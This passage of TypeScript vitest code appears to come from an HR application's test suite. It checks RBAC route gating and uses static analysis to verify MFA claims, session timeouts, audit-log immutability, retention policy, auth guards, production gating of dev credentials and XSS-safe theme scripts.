  it('RBAC-BL03-002: middleware gates /admin/probation to the HR triad', () => {
    expect(gateAllowed('/admin/probation')).toMatch(TRIAD)
  })

  it('RBAC-BL03-003: middleware /admin/exit-clearance uses the 5-role super-set (no detail-page loss)', () => {
    const seg = gateAllowed('/admin/exit-clearance')
    // Must include MANAGER + PAYROLL_ADMIN or the detail page loses legitimate users.
    for (const r of ['HR_ADMIN', 'HR_DIRECTOR', 'MANAGER', 'PAYROLL_ADMIN', 'SUPER_ADMIN']) {
      expect(seg).toContain(`'${r}'`)
    }
    expect(seg).not.toMatch(/FINANCE/)
  })

  it('RBAC-BL03-004: exit-clearance middleware gate is a super-set of the detail page guard (regression guard)', () => {
    // Extract the detail page ALLOWED_ROLES and assert every role is in the gate.
    const i = exitDetail.indexOf('ALLOWED_ROLES')
    const pageArr = exitDetail.slice(i, exitDetail.indexOf(']', i) + 1)
    const seg = gateAllowed('/admin/exit-clearance')
    for (const r of ['HR_ADMIN', 'HR_DIRECTOR', 'MANAGER', 'PAYROLL_ADMIN', 'SUPER_ADMIN']) {
      if (pageArr.includes(`'${r}'`)) expect(seg).toContain(`'${r}'`)
    }
  })

  it('RBAC-BL03-005: /admin/dataops stays SUPER_ADMIN-only and is ordered before the new /admin/* gates', () => {
    expect(gateAllowed('/admin/dataops')).toMatch(/\[\s*'SUPER_ADMIN'\s*\]/)
    expect(mw.indexOf("'/admin/dataops'")).toBeLessThan(mw.indexOf("'/admin/probation'"))
    expect(mw.indexOf("'/admin/dataops'")).toBeLessThan(mw.indexOf("'/admin/exit-clearance'"))
    // No broad '/admin' prefix entry (would mis-gate dataops).
    expect(mw).not.toMatch(/prefix:\s*'\/admin'\s*,/)
  })
})

/**
 * Security Static Analysis Tests
 *
 * These tests scan source code for security anti-patterns and verify that
 * NFR-09 (MFA), NFR-10 (session timeout), and NFR-22 (audit immutability)
 * requirements are addressed in code — without requiring a live server.
 */

import { describe, it, expect } from 'vitest'
import fs from 'fs'
import path from 'path'

const ROOT = path.resolve(__dirname, '../..')

function readFile(rel: string) {
  return fs.readFileSync(path.join(ROOT, rel), 'utf-8')
}

function findFiles(dir: string, ext: string): string[] {
  const results: string[] = []
  function walk(d: string) {
    for (const entry of fs.readdirSync(d, { withFileTypes: true })) {
      const full = path.join(d, entry.name)
      if (entry.isDirectory() && !entry.name.startsWith('.') && entry.name !== 'node_modules') {
        walk(full)
      } else if (entry.isFile() && (entry.name.endsWith(ext) || ext === '*')) {
        results.push(full)
      }
    }
  }
  walk(path.join(ROOT, dir))
  return results
}

function getServerActionFiles(): string[] {
  return [
    ...findFiles('modules', '.ts'),
    ...findFiles('lib', '.ts'),
  ].filter(f => !f.includes('.test.') && !f.includes('node_modules'))
}

// ── NFR-09 — MFA mandatory for HR_ADMIN+ ─────────────────────────────────────

describe('NFR-09 — MFA enforcement', () => {
  it('JWT type carries a step-up MFA claim (in types or auth)', () => {
    const authTs = readFile('lib/auth.ts')
    const coreHrTypes = readFile('modules/core-hr/types.ts')
    // MFA claim may be in types.ts (step-up claim on SessionUser) rather than auth.ts
    const hasMfaOrStepUp =
      /mfa|stepUp|step.up|totp|otp|two.factor/i.test(authTs) ||
      /mfa|stepUp|step.up|totp|otp|two.factor/i.test(coreHrTypes)
    expect(
      hasMfaOrStepUp,
      'NFR-09 FAIL: No MFA/step-up claim found in auth.ts or core-hr/types.ts — required for HR_ADMIN+ per NFR-09'
    ).toBe(true)
  })

  it('MFA step-up is typed in SessionUser or JWT types', () => {
    const coreHrTypes = readFile('modules/core-hr/types.ts')
    const hasMfaClaim = /stepUp|step_up|mfa|MFA/i.test(coreHrTypes)
    expect(
      hasMfaClaim,
      'No MFA/step-up claim found in core-hr types — JWT must carry a step-up claim per S3-10'
    ).toBe(true)
  })

  it('MFA is documented as NOT enforced in Phase 1 (known gap)', () => {
    const coreHrServices = readFile('modules/core-hr/services.ts')
    const documentsPhase1Deferral = /phase 1|Phase 1|sprint.*11|Sprint.*11|step.up.*MFA/i.test(coreHrServices)
    // This test DOCUMENTS the gap — it passes to acknowledge the known deferral
    expect(documentsPhase1Deferral, 'MFA deferral not documented in services — add a comment').toBe(true)
  })
})

// ── NFR-10 — Session timeout ──────────────────────────────────────────────────

describe('NFR-10 — Session timeout configuration', () => {
  it('auth.ts configures a session maxAge', () => {
    const authTs = readFile('lib/auth.ts')
    const hasMaxAge = /maxAge|max_age|expires|sessionExpiry/i.test(authTs)
    // FAIL if no maxAge is set — default Auth.js JWT = 30 days, violates NFR-10
    expect(
      hasMaxAge,
      'NFR-10 FAIL: No session maxAge configured in lib/auth.ts. ' +
      'Default Auth.js JWT TTL is 30 days. Required: 30 min (employee) / 15 min (admin).'
    ).toBe(true)
  })

  it('employee session timeout does not exceed 30 minutes (1800s)', () => {
    const authTs = readFile('lib/auth.ts')
    // Extract any numeric maxAge value
    const match = authTs.match(/maxAge\s*:\s*(\d+)/)
    if (!match) {
      // No maxAge found — fails the previous test, skip this assertion
      return
    }
    const seconds = parseInt(match[1], 10)
    expect(
      seconds,
      `NFR-10 FAIL: session maxAge is ${seconds}s (${seconds / 60} min) — must be ≤ 1800s (30 min) for employees`
    ).toBeLessThanOrEqual(1800)
  })
})

// ── NFR-22 — Audit log immutability ──────────────────────────────────────────

describe('NFR-22 — Audit log immutability and 7-year retention', () => {
  it('writeAuditLog never performs UPDATE or DELETE on audit_log table', () => {
    const auditTs = readFile('lib/audit.ts')
    // writeAuditLog should only contain INSERT (db.insert)
    const hasUpdate = /db\.update\s*\(\s*auditLog\b/i.test(auditTs)
    const hasDelete = /db\.delete\s*\(\s*auditLog\b/i.test(auditTs)
    expect(hasUpdate, 'NFR-22 FAIL: lib/audit.ts contains db.update(auditLog) — audit rows must be immutable').toBe(false)
    expect(hasDelete, 'NFR-22 FAIL: lib/audit.ts contains db.delete(auditLog) — audit rows must be immutable').toBe(false)
  })

  it('no module action files perform DELETE on audit_log', () => {
    const actionFiles = getServerActionFiles().filter(f => f.endsWith('actions.ts'))
    const violators: string[] = []
    for (const f of actionFiles) {
      const content = fs.readFileSync(f, 'utf-8')
      if (/db\.delete.*auditLog|delete.*from.*audit_log/i.test(content)) {
        violators.push(f.replace(ROOT + '/', ''))
      }
    }
    expect(
      violators,
      `NFR-22 FAIL: These files delete from audit_log: ${violators.join(', ')}`
    ).toHaveLength(0)
  })

  it('retention-policy.ts exists and references 7-year retention', () => {
    const retentionTs = readFile('lib/retention-policy.ts')
    const has7Year = /7\s*year|seven.*year|2557|84.*month/i.test(retentionTs)
    expect(
      has7Year,
      'NFR-22 FAIL: lib/retention-policy.ts does not reference 7-year retention period'
    ).toBe(true)
  })
})

// ── RBAC guard coverage ───────────────────────────────────────────────────────

describe('RBAC — server action guard coverage', () => {
  it('all live (non-skeleton) server action files call requireRole or auth()', () => {
    const actionFiles = findFiles('modules', '.ts')
      .filter(f => f.endsWith('actions.ts') && !f.includes('.test.') && !f.includes('node_modules'))

    const unguarded: string[] = []
    for (const f of actionFiles) {
      const content = fs.readFileSync(f, 'utf-8')
      const hasServerDirective = content.includes('"use server"') || content.includes("'use server'")
      if (!hasServerDirective) continue

      // Skip skeleton files (export {} with no real functions)
      const hasFunctions = /export\s+async\s+function\s+\w/.test(content)
      if (!hasFunctions) continue

      const hasGuard =
        /requireRole/.test(content) ||
        /getCurrentUser/.test(content) ||
        /auth\(\)/.test(content)

      if (!hasGuard) {
        unguarded.push(f.replace(ROOT + '/', ''))
      }
    }
    expect(
      unguarded,
      `RBAC FAIL: These live server action files have no auth guard:\n${unguarded.join('\n')}`
    ).toHaveLength(0)
  })
})

// ── DEV credentials provider ─────────────────────────────────────────────────

describe('Dev credentials provider', () => {
  it('DEV_ADMIN_EMAIL credentials provider should be conditional on NODE_ENV !== production', () => {
    const authTs = readFile('lib/auth.ts')
    const hasDevCredentials = /DEV_ADMIN_EMAIL|credentials\s*\(/i.test(authTs)
    if (!hasDevCredentials) {
      // No dev credentials found — safe
      expect(true).toBe(true)
      return
    }
    // Dev credentials exist — they MUST be gated on non-production.
    // 2026-06-12: gating moved from inline NODE_ENV checks in auth.ts to the
    // centralised guardrail areDevAccountsAllowed() (lib/environment-guardrails.ts),
    // which is STRICTER: it returns false when DATABASE_ENV=production, when
    // VERCEL_ENV=production without DATABASE_ENV, and otherwise requires
    // NODE_ENV=development or ENABLE_DEV_ACCOUNTS=true. Accept either the
    // legacy inline gate or the guardrail call — and when the guardrail is
    // used, verify the guardrail itself contains the production checks.
    const inlineGate = /NODE_ENV.*production|process\.env\.NODE_ENV/i.test(authTs)
    const usesGuardrail = /areDevAccountsAllowed\s*\(/.test(authTs)
    let guardrailGate = false
    if (usesGuardrail) {
      const guardrails = readFile('lib/environment-guardrails.ts')
      guardrailGate =
        /isProductionDatabaseEnv\([^)]*\)\)\s*return false/.test(guardrails) &&
        /NODE_ENV\s*===\s*'development'|env\.NODE_ENV/.test(guardrails)
    }
    expect(
      inlineGate || guardrailGate,
      'SEC-CRED FAIL: DEV_ADMIN_EMAIL credentials provider is not gated on non-production (Known Gap #2) — neither inline NODE_ENV gate nor areDevAccountsAllowed() guardrail found'
    ).toBe(true)
  })
})

    expect(scriptMatch, 'themeScript should be defined as a template literal').toBeTruthy()
    if (scriptMatch) {
      const scriptContent = scriptMatch[1]
      // Must NOT interpolate variables from user/DB into script
      const hasInterpolation = /\$\{(?!`)[^`]*\}/.test(scriptContent)
      expect(
        hasInterpolation,
        'XSS RISK: themeScript interpolates runtime values — only static localStorage reads are safe'
      ).toBe(false)
    }
  })
})
